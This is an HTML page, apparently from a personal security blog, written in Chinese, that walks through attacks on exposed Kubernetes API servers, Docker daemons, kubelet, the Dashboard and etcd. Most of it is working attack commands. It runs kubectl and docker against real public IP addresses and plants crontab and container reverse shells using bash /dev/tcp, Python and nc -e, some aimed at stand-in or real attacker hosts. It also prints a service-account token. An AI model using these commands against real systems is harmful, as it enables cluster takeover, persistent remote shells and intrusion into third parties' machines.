@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>云容器安全 ~ Misaki&#39;s Blog</title>
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+        
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
+        
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://raw.githubusercontent.com/MisakiKata/misakikata.github.io/master/img/wxmini.png" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-comments"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">云容器安全</h1>
+        <p class="text-center"><b>Tuesday, March 22nd 2022, 4:24 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h3 id="云容器安全初识"><a href="#云容器安全初识" class="headerlink" title="云容器安全初识"></a>云容器安全初识</h3><h4 id="API-Server未授权访问"><a href="#API-Server未授权访问" class="headerlink" title="API Server未授权访问"></a>API Server未授权访问</h4><p>利用两个外部的环境：<a target="_blank" rel="noopener" href="http://34.219.148.35:8080/">http://34.219.148.35:8080/</a>、<a target="_blank" rel="noopener" href="http://212.193.88.186:8080/">http://212.193.88.186:8080/</a></p>
+<p>API Server 默认会开启两个端口：<code>8080</code> 和 <code>6443</code>。<br>其中 8080 端口无需认证，应该仅用于测试。6443 端口需要认证，且有 TLS 保护。</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl create clusterrolebinding system:anonymous --clusterrole&#x3D;cluster-admin --user&#x3D;system:anonymous   &#x2F;&#x2F;使6443 端口允许匿名用户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>直接访问 8080 端口会返回可用的 API 列表，如：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+  &quot;paths&quot;: [
+    &quot;&#x2F;api&quot;,
+    &quot;&#x2F;api&#x2F;v1&quot;,
+    &quot;&#x2F;apis&quot;,
+    &quot;&#x2F;apis&#x2F;extensions&quot;,
+    &quot;&#x2F;apis&#x2F;extensions&#x2F;v1beta1&quot;,
+    &quot;&#x2F;healthz&quot;,
+    &quot;&#x2F;healthz&#x2F;ping&quot;,
+    &quot;&#x2F;logs&#x2F;&quot;,
+    &quot;&#x2F;metrics&quot;,
+    &quot;&#x2F;resetMetrics&quot;,
+    &quot;&#x2F;swagger-ui&#x2F;&quot;,
+    &quot;&#x2F;swaggerapi&#x2F;&quot;,
+    &quot;&#x2F;ui&#x2F;&quot;,
+    &quot;&#x2F;version&quot;
+  ]
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而直接访问 6443 端口会提示无权限：`User “system:anonymous” cannot get at the cluster scope.</p>
+<p>如果安装了dashboard，访问 <code>/ui</code> 会跳转到 <code>dashboard</code> 页面，可以创建、修改、删除容器，查看日志等。</p>
+<p>Kubernetes 官方提供了一个命令行工具 <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/user-guide/kubectl-overview/">kubectl</a>。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 获得所有节点
+kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get nodes
+&#x2F;&#x2F; 获得所有容器
+kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get pods --all-namespaces&#x3D;true
+&#x2F;&#x2F; 在 myapp 容器获得一个交互式 shell
+kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据 Kubernetes 文档中<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">挂载节点目录</a>的例子，可以写一个 <code>myapp.yaml</code>，将节点的根目录挂载到容器的 <code>/mnt</code> 目录。</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+kind: Pod
+metadata:
+  name: myapp
+spec:
+  containers:
+  - image: nginx
+    name: test-container
+    volumeMounts:
+    - mountPath: &#x2F;mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后使用 kubectl 创建容器：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 由 myapp.yaml 创建容器
+kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F;http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; create -f myapp.yaml
+​
+&#x2F;&#x2F; 等待容器创建完成
+&#x2F;&#x2F; 获得 myapp 的交互式 shell
+kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash
+​
+&#x2F;&#x2F; 向 crontab 写入反弹 shell 的定时任务
+echo -e &quot;* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab
+​
+&#x2F;&#x2F; 也可以用 python 反弹 shell
+echo -e &quot;* * * * * root &#x2F;usr&#x2F;bin&#x2F;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221613236.png" alt="image-20220311143128477"></p>
+<p>如果不需要反弹shell，只需要在docker内执行命令的话</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp -it -- ls &#x2F;etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以上使用的端口为8080，如果需要使用6443，则需要将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p>
+<p><strong>使用shodan上的一个环境</strong>，<a target="_blank" rel="noopener" href="https://34.209.45.207:6443/%E3%80%82">https://34.209.45.207:6443/。</a></p>
+<p>查看pods：</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods?limit&#x3D;500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614321.png" alt="image-20220311160028406"></p>
+<p>添加一个pods</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发送一段json数据</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;annotations&quot;:&#123;&quot;kubectl.kubernetes.io&#x2F;last-applied-configuration&quot;:&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;kind\&quot;:\&quot;Pod\&quot;,\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;&#125;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;:&#123;\&quot;containers\&quot;:[&#123;\&quot;image\&quot;:\&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;volumeMounts\&quot;:[&#123;\&quot;mountPath\&quot;:\&quot;&#x2F;host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot;:\&quot;&#x2F;\&quot;,\&quot;type\&quot;:\&quot;Directory\&quot;&#125;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;&#125;\n&quot;&#125;,&quot;name&quot;:&quot;test-4444&quot;,&quot;namespace&quot;:&quot;default&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test-4444&quot;,&quot;volumeMounts&quot;:[&#123;&quot;mountPath&quot;:&quot;&#x2F;host&quot;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;],&quot;volumes&quot;:[&#123;&quot;hostPath&quot;:&#123;&quot;path&quot;:&quot;&#x2F;&quot;,&quot;type&quot;:&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614134.png" alt="image-20220311162415147"></p>
+<p>执行命令，</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>提示错误，对于websocket连接，首先进行http(s)调用，然后是使用HTTP Upgrade标头对websocket的升级请求。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+  &quot;kind&quot;: &quot;Status&quot;,
+  &quot;apiVersion&quot;: &quot;v1&quot;,
+  &quot;metadata&quot;: &#123;
+​
+  &#125;,
+  &quot;status&quot;: &quot;Failure&quot;,
+  &quot;message&quot;: &quot;Upgrade request required&quot;,
+  &quot;reason&quot;: &quot;BadRequest&quot;,
+  &quot;code&quot;: 400
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用wscat，地址：<a target="_blank" rel="noopener" href="https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip">https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip</a></p>
+<p>较新的版本只支持ws开头的协议，这里换个老点的版本</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;wscat -n -c &quot;https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;id&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="利用yaml创建反弹shell"><a href="#利用yaml创建反弹shell" class="headerlink" title="利用yaml创建反弹shell"></a>利用yaml创建反弹shell</h4><p>前提需要容器逃逸，在控制节点上创建。</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: apps&#x2F;v1
+kind: DaemonSet
+metadata:
+  name: kube-cache-node1
+  namespace: kube-system
+spec:
+  selector:
+    matchLabels:
+      app: kube-cache-node1
+  template:
+    metadata:
+      labels:
+        app: kube-cache-node1
+    spec:
+      hostNetwork: true
+      hostPID: true
+      containers:
+      - name: main
+        image: bash
+        imagePullPolicy: IfNotPresent
+        command: [&quot;bash&quot;]
+        # reverse shell
+        args: [&quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ATTACKER_IP&#x2F;ATTACKER_PORT 0&gt;&amp;1&quot;]
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: &#x2F;host
+          name: host-root
+      volumes:
+      - name: host-root
+        hostPath:
+          path: &#x2F;
+          type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用容器逃逸后的shell在目标控制节点上将上述内容保存为<code>kiit.yaml</code>并执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl apply -f kiit.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Docker-Daemon服务暴露至公网"><a href="#Docker-Daemon服务暴露至公网" class="headerlink" title="Docker Daemon服务暴露至公网"></a>Docker Daemon服务暴露至公网</h4><p>Client上使用命令后，会发送对应的请求到API，也就是Docker Daemon服务。然后docker会去对应的Registry仓库拉取镜像创建容器。</p>
+<p>这个服务本地会暴露在unix:///var/run/docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。</p>
+<p>比如：<a target="_blank" rel="noopener" href="http://68.183.144.186:2375/">http://68.183.144.186:2375/</a></p>
+<p>直接访问，或者使用docker访问</p>
+<pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看docker下的镜像</p>
+<pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>创建容器，利用bash和crontab计划任务向宿主机写入shell:</p>
+<p>centos系统挂载路径为 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p>
+<pre class="line-numbers language-none"><code class="language-none"># 查看宿主机可用镜像
+docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 image
+​
+# 启动刚刚创建的容器并连接
+docker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 start ct_id
+docker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616072.png" alt="image-20220314143117085"></p>
+<p>使用镜像来创建一个容器</p>
+<pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; dcf4d4bef137 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动成功后，自动进入了这个容器内</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616073.png" alt="image-20220314143537187"></p>
+<p>写入反弹shell</p>
+<pre class="line-numbers language-none"><code class="language-none">root@177ac63fbb2f:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;158.247.216.146&#x2F;8899 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是这个容器并没有启动，退出后会发现这个容器也停止了。需要先把这个容器启动运行。</p>
+<pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 ps -a
+docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 start 8f351dbd41d7
+docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 exec -it --user root 8f351dbd41d7 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616074.png" alt="image-20220314151745747"></p>
+<p>或者使用python来执行，例如</p>
+<pre class="line-numbers language-none"><code class="language-none">import docker
+​
+client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;192.168.11.160:2375&#x2F;&#39;)
+data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;*&#x2F;1 * * * * &#x2F;usr&#x2F;bin&#x2F;nc 192.168.11.1 21 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Kubelet-10250端口未授权访问"><a href="#Kubelet-10250端口未授权访问" class="headerlink" title="Kubelet 10250端口未授权访问"></a>Kubelet 10250端口未授权访问</h4><p>10250端口是kubelet API的HTTPS端口，该端口对外提供了Pod和Node的相关信息，如果该端口对公网暴露，并且关闭授权，则可能导致攻击。</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -k https:&#x2F;&#x2F;172.18.0.2:10250&#x2F;run&#x2F;&#123;namespace&#125;&#x2F;&#123;podName&#125;&#x2F;&#123;appName&#125; -d &quot;cmd&#x3D;whoami&quot;
+
+或：
+curl --insecure -v -H &quot;X-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -X POST &quot;https:&#x2F;&#x2F;kube-node-here:10250&#x2F;exec&#x2F;&lt;namespace&gt;&#x2F;&lt;podname&gt;&#x2F;&lt;container-name&gt;?command&#x3D;touch&amp;command&#x3D;hello_world&amp;input&#x3D;1&amp;output&#x3D;1&amp;tty&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Kubernetes-Dashboard未授权访问"><a href="#Kubernetes-Dashboard未授权访问" class="headerlink" title="Kubernetes Dashboard未授权访问"></a>Kubernetes Dashboard未授权访问</h4><p>如果Kubernetes API Server配置了Dashboard,通过路径/ui即可访问，直接访问部署一个docker即可</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+spec:
+  containers:
+  - name: busybox
+    image: busybox:1.29.2
+    command: [&quot;&#x2F;bin&#x2F;sh&quot;]
+    args: [&quot;-c&quot;, &quot;nc attacker 4444 -e &#x2F;bin&#x2F;sh&quot;]
+    volumeMounts:
+    - name: host
+      mountPath: &#x2F;host
+  volumes:
+  - name: host
+    hostPath:
+      path: &#x2F;
+      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="k8s-serviceaccount-token-泄露"><a href="#k8s-serviceaccount-token-泄露" class="headerlink" title="k8s serviceaccount token 泄露"></a>k8s serviceaccount token 泄露</h4><p>由于k8s集群部署的时候默认会在每个<code>pod</code>容器中挂载token文件到<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code></p>
+<p>我们可以通过命令行工具 <code>kubectl</code>来对<code>api-server</code>进行操作。</p>
+<p>创建一个<code>k8s.yaml</code>配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+clusters:
+- cluster:
+    insecure-skip-tls-verify: true
+    server: https:&#x2F;&#x2F;10.247.0.1
+  name: cluster-name
+contexts:
+- context:
+    cluster: cluster-name
+    namespace: test
+    user: admin
+  name: admin
+current-context: admin
+kind: Config
+preferences: &#123;&#125;
+users:
+- name: admin
+  user:
+    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行以下命令远程连接进入题目的k8s集群，成功通过认证。</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="Etcd未授权访问"><a href="#Etcd未授权访问" class="headerlink" title="Etcd未授权访问"></a>Etcd未授权访问</h4><p>其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。</p>
+<p>首先在Kubernetes中可以更改配置/etc/Kubernetes/manifests/etcd.yaml文件的内容，来将2379端口向外暴露</p>
+<p>Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3</p>
+<pre class="line-numbers language-none"><code class="language-none">export ETCDCTL_API&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列出该目录所有节点的信息<br><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/keys">http://152.7.98.135:2379/v2/keys</a></p>
+<p>添加上recursive=true参数,就会递归地列出所有的值<br><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/keys/?recursive=true">http://152.7.98.135:2379/v2/keys/?recursive=true</a></p>
+<p><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/members">http://152.7.98.135:2379/v2/members</a> 集群中各个成员的信息</p>
+<p>安装etcdctl，可以使用类似的方式查询API</p>
+<pre class="line-numbers language-none"><code class="language-none">etcdctl --endpoint&#x3D;http:&#x2F;&#x2F;[etcd_server_ip]:2379 ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>若存在路径/registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4276">https://xz.aliyun.com/t/4276</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a><br><a target="_blank" rel="noopener" href="https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/">https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/">March 22nd 2022, 4:24:43 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/">March 22nd 2022, 4:27:56 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;Open Source Security</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://misakikata.github.io/2022/03/云容器安全/'; 
